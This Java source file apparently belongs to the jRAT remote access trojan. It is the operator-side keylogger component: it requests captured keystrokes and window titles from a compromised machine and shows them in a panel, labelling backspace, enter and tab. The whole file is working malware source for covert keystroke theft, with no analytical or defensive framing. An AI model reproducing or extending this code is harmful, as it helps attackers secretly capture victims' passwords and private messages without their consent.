package pro.jrat.client.keylogger;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;

public class KeyThread implements Runnable {
	
	private RATObject server;
	private PanelKeylogger panel;
	
	public KeyThread(RATObject server, PanelKeylogger panel) {
		this.server = server;
		this.panel = panel;
	}

	@Override
	public void run() {
		try {
			server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
				@Override
				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
					int len = dis.readInt();
					
					for (int i = 0; i < len; i++) {
						byte header = dis.readByte();
						
						if (header == Plugin.KEY_HEADER) {
							char ckey = dis.readChar();
							
							String key = Character.toString(ckey);
							
							if (ckey == '\b') {
								key = "[BACKSPACE]";
							} else if (ckey == '\n' || ckey == '\r') {
								key = "[ENTER]\n\r";
							} else if (ckey == '\t') {
								key = "[TAB]\t";
							}
							
							if (panel != null) {
								panel.append(key);
							}
						} else if (header == Plugin.TITLE_HEADER) {
							String title = dis.readUTF();
													
							if (panel != null) {
								panel.append("[Window: " + title + "]");
							}
						}
					}				
				}
			});
		} catch (Exception e) {					
			e.printStackTrace();
		}	
	}

}
